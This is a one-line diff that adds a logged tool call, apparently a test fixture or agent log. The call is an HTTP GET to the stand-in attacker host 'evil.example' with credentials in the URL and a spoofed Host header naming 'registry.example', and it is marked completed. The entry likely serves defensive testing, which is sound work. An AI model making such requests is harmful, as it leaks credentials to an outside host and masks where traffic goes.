@@ -1,0 +1,1 @@
+{"seq": 1, "tool": "http_request", "args": {"method": "GET", "url": "http://user:pass@evil.example:8443/x", "headers": {"Host": "registry.example"}, "body": ""}, "status": "completed"}
